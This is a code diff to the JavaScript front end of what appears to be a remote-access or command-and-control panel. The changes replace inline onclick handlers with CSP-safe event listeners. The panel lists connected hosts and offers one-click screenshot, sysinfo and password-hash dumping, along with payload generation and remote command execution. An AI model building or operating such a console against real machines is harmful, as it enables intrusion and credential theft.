@@ -106,6 +106,8 @@ document.addEventListener('DOMContentLoaded', () => {
     startAutoRefresh();
     initializeCommandHistory();
     initFileUpload();
+    // Wire CSP-safe handlers after DOM is ready
+    initializeCSPSafeHandlers();
 });
 
 // WebSocket
@@ -310,26 +312,19 @@ async function loadConnections() {
                 : 'N/A';
             
             const quickActions = conn.status === 'online' ? `
-                <div class="quick-actions" onclick="event.stopPropagation();">
-                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands'); executeCommand('sysinfo');" title="Get full system info">
-                        📊 Info
-                    </button>
-                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands'); executeCommand('screenshot');" title="Capture screenshot">
-                        📸 Screen
-                    </button>
-                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands'); executeCommand('hashdump');" title="Dump password hashes">
-                        🔑 Hashes
-                    </button>
-                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands');" title="Open command panel">
-                        ⚡ Commands
-                    </button>
+                <div class="quick-actions">
+                    <button class="quick-btn" data-quick="info" title="Get full system info">📊 Info</button>
+                    <button class="quick-btn" data-quick="screen" title="Capture screenshot">📸 Screen</button>
+                    <button class="quick-btn" data-quick="hashdump" title="Dump password hashes">🔑 Hashes</button>
+                    <button class="quick-btn" data-quick="commands" title="Open command panel">⚡ Commands</button>
                 </div>
             ` : '';
             
             return `
                 <div class="connection-card ${statusClass} ${selectedClass}" 
                      data-connection-id="${conn.id}"
-                     onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}')">
+                     data-hostname="${conn.hostname}"
+                     data-status="${conn.status}">
                     <div class="connection-header">
                         <div class="connection-status-indicator">
                             <h3>${conn.hostname}</h3>
@@ -401,15 +396,7 @@ function updateSelectedConnectionInfo() {
 }
 
 function showCommands(category) {
-    // Update buttons
-    document.querySelectorAll('.cat-btn').forEach(btn => {
-        btn.classList.remove('active');
-    });
-    if (event && event.target) {
-        event.target.classList.add('active');
-    }
-    
-    // Update command groups
+    // Update command groups only; caller handles active button state
     document.querySelectorAll('.command-group').forEach(group => {
         group.classList.remove('active');
     });
@@ -567,7 +554,7 @@ function showInteractiveCommandForm(command, cmdDef) {
         <div class="modal-content">
             <div class="modal-header">
                 <h3>🔧 ${command.toUpperCase()} Command</h3>
-                <button class="modal-close" onclick="closeCommandModal()">&times;</button>
+                <button class="modal-close" data-action="close">&times;</button>
             </div>
             <div class="modal-body">
                 <form id="commandForm">
@@ -604,14 +591,22 @@ function showInteractiveCommandForm(command, cmdDef) {
                 </form>
             </div>
             <div class="modal-footer">
-                <button class="cmd-btn" onclick="submitCommandForm('${command}')">Execute Command</button>
-                <button class="clear-btn" onclick="closeCommandModal()">Cancel</button>
+                <button class="cmd-btn" data-action="execute" data-base-command="${command}">Execute Command</button>
+                <button class="clear-btn" data-action="cancel">Cancel</button>
             </div>
         </div>
     `;
     
     document.body.appendChild(modal);
     
+    // Wire modal buttons without inline handlers
+    const closeBtn = modal.querySelector('[data-action="close"]');
+    if (closeBtn) closeBtn.addEventListener('click', closeCommandModal);
+    const cancelBtn = modal.querySelector('[data-action="cancel"]');
+    if (cancelBtn) cancelBtn.addEventListener('click', closeCommandModal);
+    const execBtn = modal.querySelector('[data-action="execute"]');
+    if (execBtn) execBtn.addEventListener('click', () => submitCommandForm(command));
+
     // Focus first input
     const firstInput = modal.querySelector('input, select');
     if (firstInput) firstInput.focus();
@@ -1237,32 +1232,20 @@ function renderPaginationControls(containerId, paginationState, loadFunction) {
     const end = Math.min(currentPage * paginationState.pageSize, paginationState.totalItems);
     
     container.innerHTML = `
-        <div class="pagination-controls">
+        <div class="pagination-controls" data-load="${loadFunction}">
             <div class="pagination-info">
                 Showing ${start}-${end} of ${paginationState.totalItems}
             </div>
             <div class="pagination-buttons">
-                <button onclick="changePage('${loadFunction}', 1)" 
-                        ${currentPage === 1 ? 'disabled' : ''}>
-                    ⏮️ First
-                </button>
-                <button onclick="changePage('${loadFunction}', ${currentPage - 1})" 
-                        ${currentPage === 1 ? 'disabled' : ''}>
-                    ◀️ Prev
-                </button>
+                <button data-page-action="first" ${currentPage === 1 ? 'disabled' : ''}>⏮️ First</button>
+                <button data-page-action="prev" ${currentPage === 1 ? 'disabled' : ''}>◀️ Prev</button>
                 <span class="page-number">Page ${currentPage} of ${totalPages}</span>
-                <button onclick="changePage('${loadFunction}', ${currentPage + 1})" 
-                        ${currentPage === totalPages ? 'disabled' : ''}>
-                    Next ▶️
-                </button>
-                <button onclick="changePage('${loadFunction}', ${totalPages})" 
-                        ${currentPage === totalPages ? 'disabled' : ''}>
-                    Last ⏭️
-                </button>
+                <button data-page-action="next" ${currentPage === totalPages ? 'disabled' : ''}>Next ▶️</button>
+                <button data-page-action="last" ${currentPage === totalPages ? 'disabled' : ''}>Last ⏭️</button>
             </div>
             <div class="pagination-size">
                 <label>Per page:</label>
-                <select onchange="changePageSize('${loadFunction}', this.value)">
+                <select data-page-size-select>
                     <option value="10" ${paginationState.pageSize === 10 ? 'selected' : ''}>10</option>
                     <option value="25" ${paginationState.pageSize === 25 ? 'selected' : ''}>25</option>
                     <option value="50" ${paginationState.pageSize === 50 ? 'selected' : ''}>50</option>
@@ -1292,6 +1275,135 @@ function changePageSize(loadFunction, newSize) {
         filesPagination.pageSize = parseInt(newSize);
         filesPagination.currentPage = 1;
         loadFiles();
+    }
+}
+
+// ============================================
+// CSP-safe event handlers (no inline handlers)
+// ============================================
+function initializeCSPSafeHandlers() {
+    // Category buttons
+    document.querySelectorAll('.cat-btn[data-category]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            const category = btn.getAttribute('data-category');
+            if (category) showCommands(category);
+        });
+    });
+
+    // Command buttons
+    document.querySelectorAll('.cmd-btn[data-command]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const command = btn.getAttribute('data-command');
+            const withParams = btn.getAttribute('data-with-params') === 'true';
+            if (!command) return;
+            if (withParams) {
+                executeCommandWithParam(command);
+            } else {
+                executeCommand(command);
+            }
+        });
+    });
+
+    // Top-level buttons
+    const wire = (selector, handler) => {
+        const el = document.querySelector(selector);
+        if (el) el.addEventListener('click', handler);
+    };
+    wire('#refreshConnectionsBtn', () => { loadConnections(); loadServerStatus(); });
+    wire('#executeCustomBtn', () => executeCustomCommand());
+    wire('#copyOutputBtn', () => copyOutput());
+    wire('#clearOutputBtn', () => clearOutput());
+    wire('#uploadSubmitBtn', () => uploadFile());
+    wire('#uploadCancelBtn', () => cancelUpload());
+    wire('#generatePayloadBtn', () => generatePayload());
+    wire('#resetPayloadBtn', () => resetPayloadForm());
+    wire('#downloadPayloadBtn', () => downloadPayload());
+    wire('#copyPayloadInfoBtn', () => copyPayloadInfo());
+    wire('#refreshLogsBtn', () => loadLogs());
+    wire('#clearLogsBtn', () => clearDebugLogs());
+
+    // Export buttons via delegation
+    const exportContainer = document.querySelector('.export-buttons');
+    if (exportContainer) {
+        exportContainer.addEventListener('click', (e) => {
+            const btn = e.target.closest('button[data-export-type]');
+            if (!btn) return;
+            const type = btn.getAttribute('data-export-type');
+            const format = btn.getAttribute('data-format');
+            if (type === 'logs') exportLogs(format);
+            if (type === 'commands') exportCommandHistory(format);
+        });
+    }
+
+    // Search inputs
+    const connSearch = document.getElementById('connectionsSearch');
+    if (connSearch) connSearch.addEventListener('input', filterConnections);
+    const connFilter = document.getElementById('connectionsFilter');
+    if (connFilter) connFilter.addEventListener('change', filterConnections);
+    const filesSearch = document.getElementById('filesSearch');
+    if (filesSearch) filesSearch.addEventListener('input', filterFiles);
+
+    // Pagination controls (delegation)
+    const setupPaginationDelegation = (containerId, state, key) => {
+        const container = document.getElementById(containerId);
+        if (!container) return;
+        container.addEventListener('click', (e) => {
+            const btn = e.target.closest('button[data-page-action]');
+            if (!btn) return;
+            const action = btn.getAttribute('data-page-action');
+            const totalPages = getTotalPages(state.totalItems, state.pageSize);
+            if (action === 'first') changePage(key, 1);
+            if (action === 'prev') changePage(key, Math.max(1, (key === 'connections' ? connectionsPagination.currentPage : filesPagination.currentPage) - 1));
+            if (action === 'next') changePage(key, Math.min(totalPages, (key === 'connections' ? connectionsPagination.currentPage : filesPagination.currentPage) + 1));
+            if (action === 'last') changePage(key, totalPages);
+        });
+        container.addEventListener('change', (e) => {
+            const select = e.target.closest('select[data-page-size-select]');
+            if (!select) return;
+            changePageSize(key, select.value);
+        });
+    };
+    setupPaginationDelegation('connectionsPaginationControls', connectionsPagination, 'connections');
+    setupPaginationDelegation('filesPaginationControls', filesPagination, 'files');
+
+    // Connections grid delegation (select + quick actions)
+    const connectionsGrid = document.getElementById('connectionsGrid');
+    if (connectionsGrid) {
+        connectionsGrid.addEventListener('click', (e) => {
+            const quickBtn = e.target.closest('[data-quick]');
+            if (quickBtn) {
+                const card = quickBtn.closest('.connection-card');
+                if (!card) return;
+                const connId = card.getAttribute('data-connection-id');
+                const hostname = card.getAttribute('data-hostname') || connId;
+                const status = card.getAttribute('data-status') || 'offline';
+                selectConnection(connId, hostname, status);
+                const action = quickBtn.getAttribute('data-quick');
+                if (action === 'commands') {
+                    showSection('commands');
+                } else if (action === 'info') {
+                    showSection('commands');
+                    executeCommand('sysinfo');
+                } else if (action === 'screen') {
+                    showSection('commands');
+                    executeCommand('screenshot');
+                } else if (action === 'hashdump') {
+                    showSection('commands');
+                    executeCommand('hashdump');
+                }
+                return;
+            }
+
+            const card = e.target.closest('.connection-card');
+            if (card) {
+                const connId = card.getAttribute('data-connection-id');
+                const hostname = card.getAttribute('data-hostname') || connId;
+                const status = card.getAttribute('data-status') || 'offline';
+                selectConnection(connId, hostname, status);
+            }
+        });
     }
 }
 
